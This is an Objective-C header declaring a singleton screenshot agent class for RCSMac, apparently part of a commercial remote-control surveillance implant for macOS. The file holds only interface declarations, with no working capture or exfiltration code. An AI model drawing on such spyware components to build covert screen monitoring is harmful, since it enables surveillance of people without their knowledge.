/*
 * RCSMac - Screenshot agent
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 23/04/2009
 *  Modified by Massimo Chiodini
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>
#import <Carbon/Carbon.h>

#ifndef __RCSMAgentScreenshot_h__
#define __RCSMAgentScreenshot_h__

#import "RCSMLogManager.h"


@interface RCSMAgentScreenshot : NSObject <Agents>
{
@private
  NSMutableDictionary *mAgentConfiguration;
  uint32_t mSleepSec;
}

+ (RCSMAgentScreenshot *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
- (NSMutableDictionary *)mAgentConfiguration;

@end

#endif
